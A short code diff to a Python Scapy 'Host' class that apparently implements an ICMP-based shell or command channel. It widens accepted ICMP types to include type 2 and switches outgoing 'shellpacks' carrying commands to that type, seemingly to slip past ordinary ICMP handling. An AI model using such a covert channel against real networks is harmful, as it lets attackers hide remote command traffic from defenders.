@@ -56,7 +56,7 @@ class Host:
         """
 
         # Checks to see if the type and id are valid as well as data contents
-        if packet[ICMP].type not in (0,8):
+        if packet[ICMP].type not in (0,8,2):
             return
         elif packet[IP].src == self.ip:
             return
@@ -171,6 +171,8 @@ class Host:
         
         shellpacks = self.build_shellpacks(command=command, data=data, option=option, target_id=target_id)
         
+        icmp_type=2
+
         for shellpack in shellpacks:
             data = (IP(dst=ip, ttl=TTL)/ICMP(type=icmp_type, id=ICMP_ID)/Raw(load=shellpack))
             sr(data, timeout=0, verbose=0)
